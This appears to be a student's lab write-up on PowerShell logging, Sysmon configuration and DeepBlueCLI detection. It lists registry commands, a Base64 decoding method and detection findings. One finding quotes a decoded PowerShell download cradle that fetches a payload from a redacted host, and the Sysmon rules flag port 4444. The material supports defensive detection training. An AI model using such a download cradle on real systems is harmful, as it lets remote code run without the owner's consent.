# Day 25: The Log Master — PowerShell & Sysmon Logging

## 📝 Overview
Visibility is everything in security, and this module focuses on establishing the "eyes" needed to see what attackers are doing. By leveraging advanced PowerShell logging, custom Sysmon configurations, and DeepBlueCLI, this lab emphasizes detecting and analyzing stealthy behaviors like encoded commands and malicious scripts.

*Note: In adherence to strict operational security guidelines, specific target IP addresses and MAC addresses have been redacted from the decoded payloads in this report.*

---

## 🎯 Objectives Completed
* **PowerShell Logging Configuration (Task 101):** Enabled Script Block Logging and Transcription by modifying the Windows Registry (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell`) to capture all PowerShell activity.
* **Encoded Command Decoding (Tasks 102 & 103):** Decoded Base64-encoded PowerShell commands (executed via `-EncodedCommand`) to bypass obfuscation and reveal the attacker's true intent.
* **Custom Sysmon Configuration (Task 104 & AT75):** Built and deployed a custom Sysmon XML configuration (`sysmon_config.xml`) designed to filter out noise and specifically target suspicious `ProcessCreate` events (e.g., `powershell.exe`) and `NetworkConnect` activity (e.g., port `4444`).
* **DeepBlueCLI Detection (AT76):** Executed DeepBlueCLI against Windows event logs (`security.evtx`) and in real-time (`-Live`) to automate the detection of encoded commands, suspicious processes, and known attack patterns.

---

## 🧠 What I Learned
During this hands-on lab, I reinforced several critical log analysis and detection concepts:

* **Script Block Logging:** This feature captures the entire script content, even if it is encoded, making it an essential requirement for detecting malicious PowerShell execution.
* **Transcription:** I learned how to log every command and its output to a file, which is highly useful for thorough forensic analysis and auditing.
* **DeepBlueCLI Automation:** I utilized DeepBlueCLI to automate the analysis of Windows event logs, effectively flagging suspicious activity without requiring manual, line-by-line effort.

---

## 🛠️ Toolset & Command Reference

| Component / Command | Description |
| :--- | :--- |
| **`Set-ItemProperty [...] -Name "EnableScriptBlockLogging" -Value 1`** | Edits the registry to enable Script Block Logging. |
| **`Set-ItemProperty [...] -Name "EnableTranscripting" -Value 1`** | Edits the registry to enable Transcription. |
| **`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))`** | A native PowerShell method to decode Base64 strings. |
| **`sysmon -accepteula -i config.xml`** | Installs or updates Sysmon utilizing a custom XML configuration file. |
| **`DeepBlueCLI -LogFile security.evtx`** | Analyzes a specific security event log file for malicious artifacts. |
| **`DeepBlueCLI -Live`** | Initiates real-time monitoring of Windows event logs. |

---

## 🔍 Key Findings & Analysis
* **Deobfuscation Success:** Successfully decoded a suspicious Base64 string, revealing a malicious payload download cradle: `IF ((New-Object Net.WebClient).DownloadString("http://[REDACTED_IP]:8000/payload")`.
* **High-Fidelity Sysmon Alerts:** By implementing custom XML rules, I was able to accurately track `powershell.exe` process creations alongside outbound network connections to suspicious ports, effectively reducing default log noise.
* **Automated Threat Hunting:** Running DeepBlueCLI successfully detected an encoded PowerShell command (Event ID 4104), identified a suspicious process execution (`powershell.exe -enc`), and flagged an unusual network connection.
* **System Promotion:** Mastering these log-hunting and configuration techniques successfully unlocked the **MSGT (Master Sergeant)** promotion and marked the beginning of Phase 4 of the defensive commissioning program.
